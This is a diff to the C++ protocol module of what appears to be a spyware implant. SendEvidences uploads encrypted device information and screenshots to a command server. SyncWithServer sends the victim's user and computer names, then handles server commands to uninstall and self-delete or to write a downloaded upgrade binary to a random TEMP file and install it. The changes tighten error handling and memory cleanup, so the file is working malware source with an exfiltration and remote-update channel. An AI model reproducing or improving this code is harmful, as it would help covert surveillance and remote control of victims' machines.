@@ -26,8 +26,9 @@ BYTE pLogKey[32];
 extern PDEVICE_CONTAINER pDeviceContainer;
 
 
-VOID SendEvidences()
+BOOL SendEvidences()
 {
+	BOOL bRetVal = TRUE;
 	ULONG uHeaderSize;
 	PBYTE pHeaderBuffer;
 
@@ -73,21 +74,40 @@ VOID SendEvidences()
 					free(pDeviceContainer);
 					pDeviceContainer = NULL;
 				}
+				else
+				{
+					bRetVal = FALSE;
+#ifdef _DEBUG
+					OutputDebugString(L"[!!] got not PROTO_OK @ proto.cpp:81\n");
+#endif
+				}
 				free(pResponseBuffer);
 			}
-#ifdef _DEBUG
 			else
+			{
+#ifdef _DEBUG
+			
 				OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:81\n");
 #endif
+				bRetVal = FALSE;
+			}
 		}
-#ifdef _DEBUG
 		else
+		{
+#ifdef _DEBUG
 			OutputDebugString(L"[W] WinHTTPSendData FAIL @ proto.cpp:85\n");
 #endif		
+			bRetVal = FALSE;
+		}
+
 		free(pCryptedDeviceBuffer);
 		free(pBuffer);
 		
 	}
+#ifdef _DEBUG
+//	else
+//		OutputDebugString(L"[*] No DeviceInfo\n");
+#endif
 
 	// SCREENSHOT
 	ULONG uScreenShotLen;
@@ -97,7 +117,7 @@ VOID SendEvidences()
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] no pJPEGBuffer or uScreenShotLen!\n");
 #endif
-		return;
+		return FALSE;
 	}
 	//payload
 	pJPEGBuffer = (PBYTE)realloc(pJPEGBuffer, Align(uScreenShotLen, 16));
@@ -148,24 +168,35 @@ VOID SendEvidences()
 #ifdef _DEBUG
 				OutputDebugString(L"[!!] PROTO_ERR sending screenshot\n");
 #endif
+				bRetVal = FALSE;
 			}
+
 			free(pResponseBuffer);
 			free(pCryptedBuffer);
 		}
-#ifdef _DEBUG
 		else
+		{
+#ifdef _DEBUG
 			OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:157\n");
 #endif
+			bRetVal = FALSE;
+		}
+
 	}
-#ifdef _DEBUG
 	else
+	{
+#ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:162\n");
 #endif
+		bRetVal = FALSE;
+	}
 
 
 	free(pBuffer);
 	free(pJPEGBuffer);
 	free(pSnapAddHeader);
+
+	return bRetVal;
 }
 
 BOOL SyncWithServer()
@@ -173,7 +204,7 @@ BOOL SyncWithServer()
 	PBYTE pRandomData, pProtoMessage, pInstanceId, pCryptedBuffer;
 	ULONG uGonnaDie, uGonnaUpdate;
 	BYTE pHashBuffer[20];
-	BOOL bRetVal = TRUE;
+	BOOL bRetVal = FALSE;
 
 	uGonnaDie = uGonnaUpdate = 0;
 
@@ -302,8 +333,7 @@ BOOL SyncWithServer()
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] Ouch SHA1 does not match !!!\n");
 #endif
-		bRetVal = FALSE;
-		goto bailout;
+		return FALSE;
 	}
 
 
@@ -329,23 +359,27 @@ BOOL SyncWithServer()
 		free(pDebugString);
 #endif
 
-		bRetVal = FALSE;
-		goto bailout;
+		return FALSE;
 	}
 	
 
 	if (pProtoResponseId.uProtoCommand == PROTO_NO)
 	{
-		bRetVal = FALSE;
-		goto bailout;
+#ifdef _DEBUG
+		OutputDebugString(L"[!!] Got PROTO_NO\n");
+#endif
+		return FALSE;
 	}
 	else if (pProtoResponseId.uProtoCommand == PROTO_UNINSTALL)
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"[+] Got PROTO_UNINSTALL, I'm gonna die :(\n");
 #endif
+		if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, pSessionKey, &pCryptedBuffer)))
+			free(pCryptedBuffer);
+
 		WinHTTPClose();
-		DeleteAndDie();
+		DeleteAndDie(TRUE);
 	}
 
 
@@ -373,6 +407,9 @@ BOOL SyncWithServer()
 	memcpy(pBuffer + sizeof(ULONG), pUserNamePascal, uUserLen);
 	memcpy(pBuffer + sizeof(ULONG) + uUserLen, pComputerNamePascal, uComputerLen);
 	memcpy(pBuffer + sizeof(ULONG) + uUserLen + uComputerLen, pSourceIdPascal, uSourceLen);
+	free(pUserNamePascal);
+	free(pComputerNamePascal);
+	free(pSourceIdPascal);
 
 	// Send ID
 	if (!WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_ID, pBuffer, uBuffLen, pSessionKey, &pCryptedBuffer)))
@@ -380,7 +417,8 @@ BOOL SyncWithServer()
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHTTPSendData @ proto.cpp:381\n");
 #endif
-		goto bailout;
+		free(pBuffer);
+		return FALSE;
 	}
 	free(pCryptedBuffer);
 	free(pBuffer);	
@@ -392,7 +430,7 @@ BOOL SyncWithServer()
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:387\n");
 #endif
-		goto bailout;
+		return FALSE;
 	}
 	// decrypt it
 	Decrypt(pHttpResponseBuffer, uResponseLen, pSessionKey);
@@ -433,8 +471,8 @@ BOOL SyncWithServer()
 				{
 #ifdef _DEBUG
 					OutputDebugString(L"[!!] WinHTTPSendData FAIL @proto.cpp:435\n");
-					break;
 #endif
+					return FALSE;
 				}
 				free(pCryptedBuffer);
 
@@ -444,7 +482,7 @@ BOOL SyncWithServer()
 #ifdef _DEBUG
 					OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:433\n");
 #endif
-					break;
+					return FALSE;
 				}
 				Decrypt(pHttpUpgradeBuffer, uResponseLen, pSessionKey);
 
@@ -458,23 +496,31 @@ BOOL SyncWithServer()
 				OutputDebugString(pDebugString);
 				free(pDebugString);
 #endif
-				PWCHAR pUpgradePath = (PWCHAR)malloc((32767 * sizeof(WCHAR)) + pProtoUpgrade->uUpgradeNameLen);
-				GetEnvironmentVariable(L"TMP", pUpgradePath, 32767 * sizeof(WCHAR));
-				wcscat_s(pUpgradePath, 32767 + (pProtoUpgrade->uUpgradeNameLen/sizeof(WCHAR)), L"\\");
 
+				//FIXME DELETE THIS (it's from memory now!)
+				PWCHAR pUpgradePath = GetTemp();
 				PWCHAR pRandString = GetRandomString(5);
-				wcscat_s(pUpgradePath, 32767 + (pProtoUpgrade->uUpgradeNameLen/sizeof(WCHAR)), pRandString);
-				wcscat_s(pUpgradePath, 32767 + (pProtoUpgrade->uUpgradeNameLen/sizeof(WCHAR)), L".tmp");
-
+				PWCHAR pUpgradeFileName = (PWCHAR)malloc(4096*sizeof(WCHAR));
+				_snwprintf_s(pUpgradeFileName, 4096, _TRUNCATE, L"%s\\%s.tmp", pUpgradePath, pRandString);
+				free(pUpgradePath);
+				free(pRandString);
+#ifdef _DEBUG
+				OutputDebugString(pUpgradeFileName);
+#endif
+			
 				ULONG uFileLength = *(PULONG) (((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen);
 				PBYTE pFileBuffer = (PBYTE)(((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen) + sizeof(ULONG);
 
 				// upgrade & exit
-				if (Upgrade(pUpgradePath, pFileBuffer, uFileLength))
+				if (Upgrade(pUpgradeFileName, pFileBuffer, uFileLength))
 					uGonnaDie = 1;
+#ifdef _DEBUG
+				else
+					OutputDebugString(L"[!!] Upgrade FAILED\n");
+#endif
 
-				free(pRandString);
-				free(pUpgradePath);
+				free(pFileBuffer);
+				free(pUpgradeFileName);
 				free(pUpgradeName);
 				free(pHttpUpgradeBuffer);
 			}
@@ -482,12 +528,10 @@ BOOL SyncWithServer()
 	}
 	free(pHttpResponseBuffer);
 
-#ifdef _DEBUG
-	OutputDebugString(L"[+] Sending Evidences\n");
-#endif
-	SendEvidences();
+	if (SendEvidences())
+		bRetVal = TRUE;
 	
-bailout:
+
 	// send BYE
 #ifdef _DEBUG
 	OutputDebugString(L"[*] Sending PROTO_BYE\n");
@@ -498,12 +542,11 @@ bailout:
 	else
 		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:499\n");
 #endif
-	
 
 	if (uGonnaDie)
 	{
 		WinHTTPClose();
-		DeleteAndDie();
+		DeleteAndDie(TRUE);
 	}
 
 	free(pProtoMessage);
